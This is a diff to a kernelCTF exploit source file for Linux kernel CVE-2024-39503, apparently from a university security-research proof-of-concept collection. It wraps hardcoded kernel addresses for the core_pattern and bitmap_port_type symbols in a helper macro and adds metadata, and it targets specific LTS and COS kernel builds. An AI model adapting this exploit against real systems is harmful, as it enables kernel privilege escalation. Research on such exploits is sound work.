--- /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2024-39503_lts_cos/exploit/lts-6.6.30/exploit_original.c
+++ /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2024-39503_lts_cos/exploit/lts-6.6.30/exploit_original.c
@@ -1,3 +1,5 @@
+#include "kexploit.h"
+__kexploit_src_metadata("{\"original_kernel_name\":\"kernelctf_6.6.30_lts\",\"current_kernel_name\":\"kernelctf_6.6.30_lts\"}")
 #define _GNU_SOURCE
 #include <arpa/inet.h>
 #include <linux/filter.h>
@@ -62,11 +64,11 @@
 // #define COS_109_17800_218_20 1
 
 #if LTS_6_6_30
-u64 core_pattern = 0xffffffff83db4420;
-u64 bitmap_port_type = 0xffffffff83eec040;
+u64 core_pattern = __kexploit_kernel_address(0xffffffff83db4420);
+u64 bitmap_port_type = __kexploit_kernel_address(0xffffffff83eec040);
 #elif COS_109_17800_218_20
-u64 core_pattern = 0xffffffff839ba9e0;
-u64 bitmap_port_type = 0xffffffff83afb520;
+u64 core_pattern = __kexploit_kernel_address(0xffffffff839ba9e0);
+u64 bitmap_port_type = __kexploit_kernel_address(0xffffffff83afb520);
 #else
 #error "unknown version"
 #endif
